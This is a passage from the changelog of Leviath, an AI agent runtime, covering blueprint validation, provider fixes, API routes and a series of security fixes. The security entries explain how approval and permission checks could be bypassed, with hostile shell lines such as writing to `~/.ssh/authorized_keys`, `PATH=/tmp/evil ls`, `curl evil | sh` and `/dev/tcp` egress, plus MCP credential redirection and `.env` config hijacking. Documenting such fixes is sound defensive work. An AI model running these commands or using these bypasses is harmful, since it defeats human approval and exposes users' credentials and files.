# Changelog

Notable changes to Leviath. Versions follow [semver](https://semver.org); the
workspace publishes in lockstep, so one version covers every `leviath-*` crate
and the `lev` binary.

Release binaries ship through the alpha, beta, and stable channels described
in [the release docs](https://leviath.dev/docs/releases); each versioned
GitHub release also carries auto-generated notes listing the merged pull
requests since the previous version. A channel publishes only when the version
below it has moved, so the headings here and the releases on GitHub are the
same list.

## Unreleased

- Fixed: a stage the run never entered is recorded `skipped`, not `complete`
  (#372). The ledger marked every stage positioned before the cursor complete,
  which is only the same thing in a linear blueprint: a graph reaches its stages
  in whatever order its edges describe, so every branch a run went past without
  taking was filed as having run, with an empty `region_tokens`. Since that map
  is a snapshot, an empty one in the middle of the sequence made the *next* real
  stage appear to have written every region from nothing - which is how a
  tool-less output stage came to look like it had written 153,983 tokens. Stage
  records also carry `entered`, so a consumer can tell the two apart without the
  "empty map means it did not run" heuristic.

- Breaking: a blueprint value that is not one of the spellings a setting
  accepts is refused, naming what is valid. Four settings took anything and
  quietly used a default instead: `tool_permissions` values, `on_worker_failure`,
  an interaction point's `style`, and a sliding window's `strategy`. The first
  is the sharp one - anything unrecognised resolved to `ask`, so a misspelled
  `deny` produced a prompt where a refusal was written, and a prompt can be
  answered by a session grant or `--yolo`. The same typo in `config.toml` has
  always been refused, because that side deserializes into an enum; this closes
  the gap the other way round.
- Fixed: an unknown key in `config.toml` is reported wherever it sits, not only
  at the top level (#365). `[limits] max_concurrent_tool` used to be accepted in
  silence. Keys are now judged by asking serde - deserialize, serialize back,
  and report what did not survive - so this needs no list to maintain and stays
  right as fields come and go. It also leaves `[model_providers.<name>]` alone,
  which deliberately forwards unrecognised keys to a Rhai script.
- New: `lev doctor` reports the same unread keys, for when the start-up warning
  scrolls past, and names a `[rate_limits.<provider>]` entry whose provider does
  not exist - a case the key check cannot see, since that table accepts any name
  and a misspelled provider simply throttles nothing.
- New: a region named `stage_instructions` receives the entering stage's
  `system_prompt`, if a blueprint declares one (#366). Stage instructions have
  always been pinned context, but the region holding them was chosen by
  accident - whichever pinned region was declared first - so its tokens were
  charged to that region's name in the stage ledger, it could not be sized or
  scoped, and it sat wherever that region sat in the cacheable prefix. Measured
  on a two-stage agent: `task` reported 65 tokens where 63 of them were the
  stage prompt, and 2 were the task. Declared, the same run reports `task` 2 and
  `stage_instructions` 63. The region is also assembled after every other pinned
  block whatever order it was declared in, so the prefix in front of it is
  byte-identical across a transition rather than being rewritten at the head on
  every stage change. A blueprint that declares nothing by that name behaves
  exactly as before.

- Breaking: a blueprint key the parser does not read is now refused, naming
  what is valid, in `[stages.X]`, `[stages.X.context]`,
  `[stages.X.tool_routing]`, a transition edge and its `gate` (#362). The
  parser walks the TOML by hand, so anything it did not recognise was accepted
  and dropped: `lev validate` called the blueprint good and the only symptom
  was a stage behaving as though the line had not been written. That is worst
  for the features whose whole value is expressing intent precisely - an
  ignored gate is a review loop that never gates, which reads as the model
  behaving well. Region names are checked the same way: routing targets and
  gate targets must name a region some stage declares, and
  `require_no_open_items` must name a `checklist` region, since pointed at any
  other kind it can only ever count zero and pass on the first attempt.
- Breaking: `[stages.X.tool_routing.overrides]` accepts
  `tool = { region = "...", max_result_tokens = N }` as well as
  `tool = "region"`, and refuses anything else (#361). The table form parsed
  clean and did nothing - and cost more than an unsupported shape should,
  because the entry fell through the string-only match arm entirely, so the
  tool lost the region it named *as well as* the cap and landed in
  `default_region` uncapped. A non-integer or negative ceiling is now an error
  in both this table and `max_result_tokens_per_tool`, where it used to be
  skipped in silence.
- Fixed: a stage's `description` is read. Every bundled agent writes one,
  `Stage` had the field and a builder for it, and the manifest parser never
  looked at the key.
- Fixed: `checklist` is listed among the valid region kinds when a kind is
  misspelled. It has always parsed; a user who typo'd it was told it does not
  exist.
- Fixed: a top-level key in `config.toml` that nothing reads is named in a
  warning rather than ignored (#362). A warning and not an error on purpose:
  every command reads that file, so refusing to load it over one stale key
  would take the CLI down rather than the one thing the key was meant to
  affect.
- Fixed: an OpenRouter model's context window comes from OpenRouter, not from
  the table compiled into this build (#360, and the half of #337 that was left
  undone). The daemon reads `/models` once at start-up and uses the
  `context_length` it reports; the 128 000-token fallback now applies only to a
  model that neither the API nor the table describes. Region budgets are
  percentages of the window, so a `budget = "30%"` region on a 1M-token model
  was being sized at 38 400 instead of 314 572, silently. A
  `[model_capabilities]` entry still outranks both, and only the two sizes come
  from the API - whether a model accepts temperature or tools is about the
  shape of a request, which the compiled table is the only thing that knows.
  Reading it is bounded and never fatal: a provider that cannot answer in ten
  seconds keeps the built-in table and the daemon starts anyway.

## 0.3.2 - 2026-08-10

- Breaking: a run that required a final output and never produced one now ends
  as an error rather than `complete` (#339). The requirement gate forces past
  the obligation once its retries are spent, which is right - a later stage may
  still answer - but nothing downgraded the terminal status, so a run reported
  success with no `final_output` on disk while `lev result` exited non-zero on
  the same run. The output-retry budget is also no longer borrowed from the
  stage's `max_revisits`: those are different questions, and conflating them let
  a routing setting silently multiply an inference bill, since each retry
  re-sends the whole stage context and an output stage runs last.
- Breaking: `read_file` is capped at 256 KiB and says so in the result when it
  applies (#344). It had no bound at all, so a large file went into its region
  whole and was either truncated or dropped as `[result omitted]` depending on
  how full the region already was - a cliff rather than a limit. `shell` has
  been capped since it existed.
- Changed: a stage that omits a region from `[stages.X.context.regions]` now
  hides it rather than destroying it (#341). Omitted regions were dropped from
  the window, so re-declaring one downstream brought it back empty, and an
  author had to choose between carrying a large preview through every call of
  every stage and losing it. `conversation`, `tool_results` and `final_output`
  stay visible whatever a stage declares.
- New: `condition = "dead_end"` fires when the graph would otherwise strand -
  the stage finished and every normal edge's target has spent its
  `max_revisits` (#346). The alternatives were a plain edge to the output stage,
  which the model can take at the end of every visit (measured: pipelines
  collapsed in 10 of 24 runs of one agent and 21 of 36 of another), or nothing,
  which kills the run with everything it established. `lev validate`'s
  `dead-end-possible` now counts what the runtime actually consults and stops
  recommending `condition = "max_iterations"`, which never fires on that path
  (#340).
- New: a `checklist` region kind whose items carry state, with `todo_add`,
  `todo_done` and `todo_note`, and a `require_no_open_items` gate (#342). A
  pinned region plus `context_append` gives persistence and no state: "compute
  the fee table" and "~~compute the fee table~~ done" are two different strings,
  so nothing could count what was left and no gate could ask.
- New: `gate = { require_region_updated = "plan" }` requires a region to have
  *changed* during the stage rather than merely to exist (#343). Every other
  gate can be satisfied by re-emitting what was already written, so a reviewer's
  rejection could be answered with the same plan until the stage ran out of
  revisits.
- New: `lev stages <run-id>` prints the per-stage token ledger, with
  `--regions` for each stage's per-region high-water marks (#347). The ledger
  has existed for a while with no CLI reader. It also now records
  `cache_write_tokens`, without which a stage showing no cache reads could not
  be told apart from one paying to write a prefix nothing reuses, and Leviath
  warns once when a stage's per-call prompt passes four times its first call -
  the shape of a region accumulating without a cap.
- Fixed: a `[model_capabilities]` entry naming only the field you want to change
  was silently dropped (#338). Entries are now merged onto the provider's own
  answer for that model, so `max_context_tokens = 1048576` on its own works and
  leaves everything else alone. A misspelled key is refused rather than ignored.
- Fixed: an OpenRouter model this build's table does not name was silently given
  a 128 000-token window (#337). Percentage region budgets resolve against that,
  so a `budget = "30%"` region on a 1M-token model was sized at 38 400 instead
  of 314 573. It now warns once per model, naming the assumed window and the
  line that corrects it.
- Fixed: an Anthropic cache breakpoint landing on a tool turn consumed budget
  and wrote nothing (#345). In an agent run nearly every message is a tool turn,
  and the breakpoint is chosen by index, so the slot was usually spent on a
  message that could not carry it - measured against the API, the difference
  between no cache at all and a 4 458-token prefix. `[providers]
  anthropic_cache_ttl = "1h"` also makes the extended TTL reachable; it was
  implemented with no way to select it.
- Fixed: `lev list --filter` was declared, parsed and never read, so every
  spelling printed the same thing, and an unknown value was accepted in silence
  (#327). It now filters, and clap rejects a spelling it does not know.
- Fixed: `o3` and `o4` could not run at all through the `openai` provider (#335).
  A model declaring no temperature support was sent `temperature: 0.0` rather
  than having the field left out, and the o-series accepts only its own default,
  rejecting `0.0` as firmly as any other value - so the one flag that exists to
  protect those models was what broke them. The field is now omitted, which is
  what the OpenRouter provider has always done for the same models.

## 0.3.1 - 2026-08-09

- Fixed: tool-using agents could not run on OpenAI's current reasoning models
  (#333). Those models apply a reasoning effort by default and reject function
  tools alongside one on `/v1/chat/completions`, so every such run failed on its
  first inference over a field Leviath never set. It now retries once with
  `reasoning_effort: "none"` when the API says that is the remedy, and remembers
  the model so later calls in the same process pay nothing. Keyed on what the
  API reports rather than on a list of model names, since an out-of-date model
  list is what broke this. Models that reject the field outright, or reject the
  value `none`, are untouched: neither ever sees it. A `reasoning_effort` you set
  yourself in `[model.parameters]` is left exactly as written.

## 0.3.0 - 2026-08-08

- **Security.** `uniq`, `tree` and `rg` are no longer on the default safe-command
  list. Each violated the rule that list states about itself - an entry "must
  not be able to write a file, execute another program, or open a network
  connection under any flag". `uniq IN OUT` writes its second operand, `tree -o`
  writes a file, and `rg --pre` runs an arbitrary command over every input file.
  The escapes are positional or unbounded, so no flag check could catch them.
  Add any of them back by name in `[safe_commands] shell` if you want them
  unprompted. `git diff --output=FILE` writes too, but read-only git is common
  enough to keep: a `git` command carrying `--output` now prompts instead.
- **Security.** A Rhai script tool's `shell()` did not answer to the `write_file`
  policy, so an agent shipping its own `.rhai` tools could redirect a write past
  a `write_file = "deny"`. A `tools` entry in `[safe_commands]` spelled with the
  `shell:` prefix bypassed the validation the `shell` list gets, and could
  pre-approve a write. `/dev/tty` was treated as a discarded write when it is the
  user's actual terminal, and `<>` was treated as a read when it opens the target
  read-write. The MCP transport followed cross-origin redirects carrying its
  configured secret headers. `.env` filtering now also refuses
  `GIT_EXTERNAL_DIFF` and its family (`git status` is safe-listed, so a cloned
  repository could get unprompted execution from it), `BASH_ENV`, the pagers, and
  the language-runtime loaders.
- A `.env` value ending in a backslash silently discarded every variable after it
  when filtering was in play. Fixed.
- **Security.** A bundle that failed validation left its files on disk. `lev add`
  extracted straight into the destination and only then checked for symlinks, so
  a refused bundle's symlinks stayed there and `discover_blueprints` would list
  the half-extracted tree as a runnable agent - and a failed *re-install* left a
  working agent half-overwritten. Bundles now unpack into a staging directory
  and are moved into place only after passing every check, so a refusal leaves
  nothing behind and a working install survives a bad update.
- Provider HTTP clients no longer follow a redirect off the origin the API key
  was meant for. reqwest strips `Authorization` across origins on its own but
  not a custom header, and the provider keys travel as `x-api-key` and
  `x-goog-api-key`. Same-origin redirects are still followed, up to five hops.
- A corrupt run archive is an error rather than an allocation. A crash-truncated
  frame could leave a garbage 64-bit length prefix, which the reader took at its
  word - during daemon recovery, the one moment the lenient reader exists to keep
  working. It now folds back to the last intact record.
- The control socket caps how much one connection may send. On Unix the peer is
  already same-uid and token-authenticated; on Windows the named pipe carries a
  default DACL, which made an unbounded read a pre-auth allocation.
- **Security.** A shell tool inherited the daemon's entire environment, so every
  `shell` call, Rhai `shell()` and command seed could see `ANTHROPIC_API_KEY`,
  `GITHUB_TOKEN`, `LEVIATH_API_TOKEN` and whatever else the person who started
  the daemon had exported - one `env` in tool output leaked the lot, and a script
  with `shell` was a way around the `env_var` gate. New `[security] shell_env`
  decides what a child sees, defaulting to `filtered`: credential-shaped names
  are withheld, `SSH_AUTH_SOCK` is deliberately kept so `git push` over agent
  keys keeps working, and every toolchain variable (`PATH`, `CARGO_HOME`,
  `JAVA_HOME`, `VIRTUAL_ENV`, `NVM_DIR`, `GOPATH`, `DOCKER_HOST`) passes
  through. `strict` drops the `SSH_AUTH_SOCK` carve-out and also withholds
  `AWS_PROFILE`, `KUBECONFIG` and friends; `custom` withholds exactly what
  `shell_env_withhold` names and infers nothing; `inherit` is the old behaviour.
  `allow_env_vars` hands a specific name over under every mode.
  This is defence in depth against accidental leakage rather than a boundary: a
  granted shell can still `cat ~/.leviath/config.toml`. Use `[sandbox]` for a
  boundary.
- **Security.** An installed blueprint could pre-approve a tool you had never
  configured, which is the normal state for most tools - nobody writes
  `shell = "ask"` into their config, since that is already the default. So a
  downloaded `agent.leviath` could give itself `shell = "allow"` on a stock
  machine, contradicting the guarantee SECURITY.md and four other pages made.
  A blueprint may now raise a tool no higher than the built-in default unless
  you configured that tool yourself, with one named exception: `web_search` and
  `web_fetch`, which read-only research agents pre-approve and which can neither
  write nor execute. That exception is exactly what the ten bundled agents need,
  so none of them changes behaviour. To go further, name the tool under
  `[agent_tool_permissions.<agent>]`, or set the new
  `[security] allow_blueprint_permissions` for every agent.
- **Security.** A blueprint's `seed = { command = "..." }` runs a host command at
  spawn, before the first inference and therefore before any approval prompt
  exists. It now has to be covered by `[safe_commands]` as well as
  `allow_seed_commands`, because a seed is precisely the case where there is
  nobody to ask. The shipped agents seed with `git ls-files`, which is a default
  safe entry, so they are unaffected; a downloaded manifest no longer gets to
  run `curl … | sh` at spawn. `lev validate` now says per seed whether it is
  pre-approved or will be refused, so this is a one-line config fix found before
  the run rather than a region that silently came up empty during it.
- **Security.** A hostile MCP server could redirect Leviath's credentials to a
  host of its choosing. A legacy HTTP+SSE server announces where to POST through
  an `endpoint` event, and joining an *absolute* URL onto the base replaces the
  base entirely - so every later request, each carrying the OAuth bearer and any
  configured secret headers, went wherever the server said. The endpoint must
  now share an origin with the server you configured; a relative path or the
  server's own absolute URL still works. Leviath also warns when an MCP server
  URL is plain `http://` to a non-loopback host, since its credentials travel in
  cleartext.
- **Security.** A `.env` in a cloned repository could replace Leviath's entire
  configuration. `Config::load` read `./.env` into the process environment
  before resolving the config path, and `LEVIATH_CONFIG_PATH` is normally unset,
  so one line in a repository you cloned pointed the next statement at a config
  file of its choosing - its `[mcp_servers]` commands, its `[tool_permissions]`,
  its provider `base_url`. Credentials still load, since that is what `.env`
  support is for; the names that steer the process are ignored with a warning
  naming them: the `LEVIATH_` namespace, `PATH`, `SHELL`, `EDITOR`, `VISUAL`,
  and `LD_*` / `DYLD_*`. A variable you exported yourself still wins over the
  file, as before.
- **Security.** `lev serve --no-remote-yolo` refused `{"yolo": true}` on a
  spawn request but not `{"allow": ["*"]}`, which reaches the same wildcard
  override by another name. Both are refused now, as is any named `allow`:
  `{"allow": ["shell"]}` is not meaningfully weaker on a server somebody
  deliberately hardened. A caller who needs a per-agent grant has
  `[agent_tool_permissions.<agent>]` in the operator's own config.
- **Security.** A shell redirect was invisible to the approval machinery, so
  `write_file = "deny"` was bypassable with `echo x > file`. The redirect target
  never reached a grant key, which meant `cat notes.md > ~/.ssh/authorized_keys`
  keyed a bare `cat` - and `cat` ships as safe, so the default configuration
  wrote arbitrary files with no prompt, in direct contradiction of the rule the
  safe list states about itself. A shell call that writes is now held to the
  `write_file` policy as well as the shell's own, and each target is its own key
  (`>/tmp/out`), so an approval names what is being written and covers only
  that. A write cannot be pre-approved in a config file at all: `[safe_commands]
  shell` rejects any entry beginning with `>`.
  Writes that keep nothing still cost nothing - `/dev/null` and the standard
  streams, descriptor duplications like `2>&1`, and read redirects - so
  `cargo build > /dev/null 2>&1` is as quiet as it was. Two shapes can never be
  granted: a target that only exists after expansion (`> $OUT`), and bash's
  `> /dev/tcp/host/port`, which is a socket rather than a file and so an egress
  channel no program name in the line describes.
- **Security.** A shell command could reach the safe list under a name that did
  not describe what it ran. `PATH=/tmp/evil ls` keyed a bare `ls`, and `ls` ships
  as safe, so it ran a binary of the caller's choosing with no prompt; the same
  hole was reachable through `export`, `unset`, `declare`, `trap`, `function` and
  `alias`, each of which contributed no key at all while deciding what a later
  program in the line resolved to. A grant key now names every variable a line
  binds, spelled `env:NAME`, and a line that installs code to run later
  (`trap`, `function`, `alias`, `unalias`) cannot be pre-approved at all.
  Two visible consequences: `FOO=1 cargo test` prompts once per run until
  `env:FOO` is granted, and `set -euo pipefail` is unaffected, since shell
  options change nothing about which program a name resolves to. Grant an
  assignment the same way as a program, with `[safe_commands] shell =
  ["env:RUST_LOG"]`. Granting one variable grants exactly that one, and no
  program name widens onto an `env:` key.
- Approving tool calls no longer means approving one per shell invocation.
  Replaying a real 224-call run through the shipped approval machinery needed 46
  prompts; the same replay now needs 16. Three things changed. The parser that
  decides what a grant covers is quote-aware and no longer truncates a command
  line at its first redirect, which was both a soundness hole (a grant covered
  programs after the redirect that the user never saw) and the reason keys like
  `shell:Could not` and `shell:for i` existed. `[safe_commands]` adds an
  argument-scoped middle between "prompt on every `ls`" and "no prompt on
  `curl evil | sh`", shipped with a read-only verb list that is on by default.
  And the context tools, which write the agent's own context regions rather than
  the filesystem, no longer prompt at all.
- An approval now has three scopes rather than two: once, for this stage, and
  for this run. Each option names what it grants ("Allow git status, ls for this
  stage") instead of saying "for this session" and leaving the user to guess,
  and a call with nothing reusable to grant says so rather than offering a scope
  the dispatcher would silently drop. Nothing is written to disk; a grant dies
  with the run that made it. `session` stays the wire name for run scope, so
  `lev respond --session`, the REST `"scope": "session"` and the ACP
  `allow-always` option are unchanged.
- Fixed: a grant used to skip policy resolution entirely, so a grant made under
  one stage survived into a later stage whose `tool_permissions` denied the
  tool. "A configured deny is terminal" now holds across a stage boundary.
- Fixed: an interaction point declaring `unattended = "ask"` that nobody
  answered was **approved** when the interaction timeout passed. An empty answer
  routed through the same branch as an ordinary approval, so `lev run --yolo` in
  CI waited an hour and then approved the plan nobody read and wrote code from
  it. An unanswered held checkpoint now stops the run with an error naming it.
  Points left on the default `auto_approve` are unaffected.
- `lev run --yolo` prints which checkpoints will still stop for a person before
  the run starts, and `lev validate` reports them as `holds-under-yolo`.
  `--yolo` waives approvals, not checkpoints, and a run that stops anyway used
  to be indistinguishable from a hang.
- Fixed: a tool permission written under an alias never matched. Policy is
  resolved against the name the model calls, which is always the canonical
  `shell`, so `[tool_permissions] bash = "allow"` granted nothing and
  `lev run --allow bash` did nothing at all. Every layer now accepts either
  spelling. The shipped `software-engineer` writes `bash = "ask"`, which had
  only ever behaved as intended because the built-in default for an unlisted
  tool is also `ask`. The `permission-name-mismatch` lint is gone with the
  problem it described.
- New: `lev approvals safe` prints what runs without an approval prompt and
  which file put each entry there.
- Fixed: a bundled blueprint installed at the bundled version read as up to date
  whatever its files said, so an install that had drifted from the one that
  shipped stayed invisible. `lev setup` now compares the files, not just the
  version, and reports a locally edited copy as `edited locally` - offered, but
  never pre-checked, because installing removes the destination directory first
  and would take the edits with it. `lev run` says it at the moment it matters:
  a run starting on an installed bundled blueprint that this build ships a
  different version of prints a one-line note before it spawns.

- **Security:** `GET /api/agents/{id}/context/history` served every run's webhook
  signing secret to any holder of the API token. The route returns points
  replayed from the run journal, and the journal stores run metadata whole,
  `callback_secret` included, because the daemon needs it to keep signing
  webhooks for a run it reloads after a restart. The redaction covering
  `/api/agents` and its siblings was never applied here. It now happens in the
  shared reader, so every consumer of a run's history inherits it.
- New: `GET /api/runs`, the run listing, paginated and searchable. It supersedes
  the `GET` half of `/api/agents`, which returns every run ever recorded as one
  unbounded array and is now deprecated. Paging is keyset rather than offset, so
  a run created or deleted mid-walk cannot shift the window; `sort=started_at`
  is the default because it is the only sort key that never changes, since
  `updated_at` advances on the persistence heartbeat. `ids=` replaces what used
  to be one request per run, and `fields=` trims each item.
- New: server-side run search, through `q=` and `q_in=`. The default sources
  read metadata already in memory and cost nothing. `context`, `logs` and
  `journal` read from disk, so they are opt-in and bounded by a scan cap that
  reports itself as `scan_truncated` with a null `total`. Matching runs carry
  highlights saying why they matched, which is the part a browser cannot work
  out for itself: it never holds a run's transcript.
- New: `GET /api/agents/{id}/files` lists a run's files when given no `path`,
  either from what the run recorded modifying or from the working directory
  itself, one directory level per request so a workdir containing
  `node_modules` cannot be enumerated in one response.
- New: `GET /api/config` reports `api_version`, a `capabilities` list and the
  server's numeric `limits`, so a client can light up features in one call
  instead of probing routes and reading a 404 as "unsupported" - which is also
  what a missing run looks like.
- New: `GET /api/agents/{id}/logs` takes `stage=<index>|all` and
  `stream=output|logs`.
- Breaking: `GET /api/blueprints` returns a paginated envelope rather than a
  bare array, and accepts `limit`, `cursor`, `q`, `sort` and `order`. Worth
  saying plainly that pagination saves the server nothing here, since discovery
  parses every manifest on every request regardless; `q` is the parameter with
  real value.
- Breaking: `GET /api/agents/{id}/context/history` is paginated. It previously
  returned every recorded point, each carrying a full context window with
  untruncated text, on a journal that grows for as long as the run does.
- Changed: `GET /api/agents/{id}/files?path=<dir>` returns a listing instead of
  a 400. Asking for a directory is the natural way to say "what is in here".
- Fixed: the run-status filter rejected the spelling it hands out. `RunMeta`
  serializes `waiting_input`, but the filter compared a lowercased `Display`,
  i.e. `waitinginput`, so feeding back a status you had just read matched
  nothing - on exactly the two statuses where the reason is least visible.
- Fixed: `GET /api/agents/{id}/logs` returned an empty string for every run. It
  read a run-level `output.log` that nothing has ever written; a run's output
  lives under `stages/<idx>/`.
- Fixed: which blueprint a name resolved to depended on `readdir` order.
  Discovery neither sorted nor deduplicated, and blueprint lookup and agent
  spawning both take the first match by name, so with one name reachable from
  two configured roots, which agent actually ran could differ between two calls.
- Fixed: `RunFlags.modified_file_count` counts modifying tool calls rather than
  distinct files, so a run that edits one file three times records three. The
  file listing reports `modifying_tool_calls` and `modified_files_truncated` as
  separate facts, so a client never subtracts one from the other to guess how
  many files there were.
- Removed: five public functions in `leviath-mcp` that nothing outside their own
  tests called. `ToolExecutor::add_client` was `add_client_advertised` with an
  empty advertised set, `ToolExecutor::execute_filtered` was `execute` behind a
  name check the caller already does, and `ToolRegistry`'s `all_tools`,
  `find_tool` and `server_tools` were superseded by the advertised-name map.
  Callers of `add_client` want `add_client_advertised(name, client, &advertised)`.
- Breaking: giving an agent a task it declares no region for is an error rather
  than a silent drop. Such a run used to spawn anyway and answer a question
  nobody asked, having spent the tokens to do it, and report `complete`. The
  error names the caller input the agent does take. Of the shipped agents only
  `reviewer` is affected, and only when passed `--task`: it takes `--diff` and
  `--criteria`. `lev run` no longer demands a task for an agent that takes none
  either, so `lev run reviewer --diff @x.patch` is now a complete command line.
- `lev validate` reports `region-seed-not-understood` for a `seed` that matches
  none of the recognized forms. Such a seed is ignored and the region starts
  empty, which is what a typo looks like: it is `{ caller = "task" }`, and
  `{ caller_input = "task" }` silently seeds nothing.

## 0.2.0 - 2026-08-04

- Windows no longer flashes console windows across the desktop. Every child
  process Leviath starts is a console application, and one started by a process
  with no console of its own gets a fresh window on the interactive desktop.
  With a `shell` call or two per agent iteration that is a strobe, and a fleet
  of agents made it worse. Every spawn whose output is already piped or
  discarded now asks for no window: the `shell` tool, a script tool's `shell()`,
  seed commands, container lifecycle commands, MCP servers, the Claude Code
  provider, the browser launcher, the dashboard's clipboard helper, and the
  daemon itself. The editor `lev run` opens for you is deliberately left alone,
  since it is the one child meant to be seen. Nothing about output capture
  changes.
- Which shell a command runs in is now decided by a function that takes the
  platform as an argument rather than by a compile-time branch, so the Windows
  answer is checked on every CI machine instead of only on the Windows one.
  Behaviour is unchanged: `cmd.exe /C` on Windows, `$SHELL` then bash, zsh, sh
  for the `shell` tool elsewhere, and always `/bin/sh -c` for script tools.
- OpenRouter works end to end. Several separate faults added up to an install
  that was configured correctly and still did nothing useful:
  - `default_provider` is now honoured. It was only consulted after every
    registered entry a blueprint listed, and the bundled agents all list
    Anthropic, OpenAI and Ollama, so setting it to `openrouter` changed
    nothing. Registered candidates on your default provider now head the
    stage's list, with the blueprint's own entries kept behind them as
    fallbacks. A stage pins its own provider with `allow_user_default = false`,
    which suppresses this as it always did.
  - A provider that cannot be reached at all now counts as unavailable, so the
    run fails over instead of dying. Ollama registers with no key whether or
    not a server is running, so a refused connection to `localhost:11434` used
    to kill runs at iteration 0 with a working provider sitting unused behind
    it in the same list.
  - Reasoning models no longer answer with nothing. They return `content: null`
    and put their text under `reasoning`, which reached the runtime as an empty
    response: the agent was nudged to use its tools, looped, and the run
    finished having said nothing. The field is read when the message carries no
    content and no tool calls, so it never displaces real output.
  - An error a gateway delivers with a 200 status is reported. OpenRouter
    answers `{"error":{...}}` with a success status when an upstream provider
    rejects a request it had already accepted, and that read as
    "No choices in response", throwing away the only text that said why. The
    envelope's own status code is classified as a real one, so a 402 arriving
    this way fails over and trips the circuit breaker like any other.
  - Errors delivered mid-stream surface instead of silently truncating the
    stream.
  - Requests carry the `X-Title` header OpenRouter pairs with `HTTP-Referer`,
    so calls are attributed to Leviath on the account's activity page.
- A hand-written `config.toml` parses. Every field on the top-level config was
  required, so the three lines that point Leviath at OpenRouter failed with
  ``missing field `providers` `` - a table the user has no reason to know
  about, in a message that says nothing about what to add.
- `lev serve` gained three read-only routes, so a browser front end can show
  what a run produced without shell access to the host. All three work with the
  daemon down.
  - `GET /api/agents/{id}/files?path=` returns one file the run wrote. The path
    may be relative to the run's working directory or absolute, but either way
    the resolved path has to land inside that directory, under the same
    symlink-aware containment the file tools use, so the endpoint reads exactly
    what the run was allowed to write. Reads stop at 1 MiB and say so; a cap
    that lands mid-character drops the split character rather than calling a
    text file binary.
  - `GET /api/doctor` runs the checks `lev doctor` runs and returns them as
    data. A failing check is an `ok: false` entry in a 200, never an HTTP error.
  - `GET /api/fs/dirs?path=` lists one directory level of subdirectory names,
    so a folder picker can offer a working directory instead of asking someone
    to type one blind. Paths must be absolute, `--workdir-root` fences it the
    same way it fences spawning, and `parent` is null at the fence so the
    picker is never offered a step above it. Add `hidden=true` for
    dot-prefixed names.
- `lev doctor`'s `resolve` check says when your configured `default_provider`
  is being passed over, and why. `default_provider` with no `default_model` is
  a half-configuration that silently does nothing, and the check used to report
  `OK` next to a provider you never asked for.

## 0.1.2 - 2026-08-02

- `lev run <agent>` with no `--task` now opens your editor on a commented
  template instead of refusing to start, so a task longer than a sentence no
  longer has to survive shell quoting. Saving an empty file cancels the run.
  Stdin still has to be a terminal: a script or CI job without `--task` gets an
  error, now worded to say why the editor cannot be used. The editor is
  `$VISUAL`, then `$EDITOR`, then the first installed of `vim`, `nano`, `vi`
  (`edit`, `notepad`, `vim` on Windows).
- `lev run .` and `lev run ./some-agent` work. The blueprint path was sent to
  the daemon exactly as typed, and the daemon resolved it against its own
  working directory, so a relative path failed with "read manifest
  './agent.leviath': No such file or directory". It is now resolved before the
  request leaves. This is the command `lev create` prints as your next step.
- `lev run` with no PATH uses the current directory, which is what the CLI
  reference has always described. It used to be an error.
- `--task` reads a file when the value names one. A value that looks like a
  path but names nothing is now an error rather than being sent to the agent as
  the prompt, which is what a mistyped filename used to become. Prompt text is
  unaffected: the check only fires on a value with no whitespace that carries a
  `/`, a `\`, or a leading `~`.
- A run stays in `lev ps` for five minutes after it ends instead of vanishing
  when the daemon unloads it. A run that died on its first inference used to
  leave the listing a second or two later, which made it indistinguishable from
  a run that had never been spawned: both read as `no agents running`. Anything
  scheduling work by spawning agents then had to guess how long a healthy agent
  takes to get going, and a guess that came in under a cold start would abandon
  runs that were still starting. The row now carries the status the run ended
  on, so an `HTTP 402` at iteration 0 says so. Tunable with
  `[limits] finished_retention_secs`; `0` restores the old behaviour. The record
  is in memory, so a restart clears it, and `meta.json` and `GET /api/agents`
  remain the durable copy.
- `lev ps --json` gained a `finished` key alongside `runs` and `health`.
  Finished runs are kept apart rather than mixed in, so `lev daemon status` and
  the dashboard still count only the agents the daemon is hosting.
- `meta.json` now records `last_progress_at`, the moment a run last actually
  moved. `updated_at` cannot answer that and never could: it advances on a
  30-second heartbeat whether or not anything happened, so that a stale
  timestamp means the daemon stopped rather than the run. Anything outside the
  daemon that aged a run on `updated_at` was reading a signal that stays fresh
  on a run which has stopped dead.
- `RunMeta.pid` is documented as what it has always been: 0 for every run, live
  or finished. There is no process per run, so nothing can be concluded from
  it, and a sweeper that reverted work on `pid == 0` reverted all of it. Left
  in place for compatibility; it is a candidate for removal in the next major.
- New `lev ps --all`, listing the runs on disk that the daemon is not hosting,
  read from the runs dir rather than the daemon's memory. The retention window
  above covers the minutes after a run ends; this covers the rest of time, and
  survives a restart, which is what a scheduler reconciling its own queue needs.
  Rows that claim on disk to be running while nothing drives them are marked
  `(abandoned)`. With `--all`, a daemon that is down is reported rather than
  fatal, and marks nothing abandoned, because a restarting daemon looks exactly
  like every run dying at once.
- New `[limits] wedge_timeout_secs`: fail a run that has ended up in a state no
  part of the engine can reach, rather than leaving it reported as running for
  the life of the daemon. It never fires on a run that is merely slow; an agent
  waiting on the model, on a tool, on its sub-agents, or on a person is exempt
  however long it takes. Off by default, since it fails runs. Together with the
  above this is what stops an external scheduler leaking slots to runs that
  have quietly stopped, and there is now a page on doing that reconciliation
  properly in the daemon docs.
- New `lev doctor`, which checks that provider wiring works without you having
  to build a throwaway agent to find out. Four checks run in order and each is
  reported: the config file parses and a registry can be built, your defaults
  resolve to a provider that is actually registered, one real inference reaches
  the model, and a one-turn agent spawns over the control socket and finishes.
  The check that fails is the diagnosis. That last one matters most: config,
  resolve and inference passing while `daemon` fails is the difference between
  "my keys are wrong" and "the daemon is wedged", which used to look identical
  from the outside.
- `lev doctor` prints the provider and model it actually resolved to, not just
  "OK". A stage that names no model of its own falls back to `anthropic`, so a
  machine holding only an OpenRouter key can resolve to a provider it has no
  credential for, spawn, and sit at iteration 0 — which is how a batch of runs
  once went nowhere at once. Now it says so, before anything is spawned.
- A failing provider call is reported verbatim, status line and response body
  included, so a 402 naming the exhausted credit or a 404 naming the model
  reads as itself rather than as "inference failed". `--model provider/model`
  tries a model string before you wire it into a blueprint, and is the only way
  to reach a Rhai script provider, which is resolved by name and cannot be
  listed. `--no-daemon` stops after the inference; `--json` prints the checks
  for scripts; a failure exits non-zero, so it works as a CI gate.
- The probe cleans up after itself: the throwaway agent is staged in a temp
  directory and its run is deleted on every path out, including the failing
  ones, so nothing is left in `lev ps` or on disk.
- A provider that runs out of credits no longer takes every agent down with it.
  A `402` arrived as an opaque API error carrying the raw JSON body, so the
  runtime had nothing to branch on and each run died at iteration 0 with the
  blob as its status. Out-of-credits, rejected-key, and not-permitted responses
  are now told apart from an ordinary bad request, including the ones that
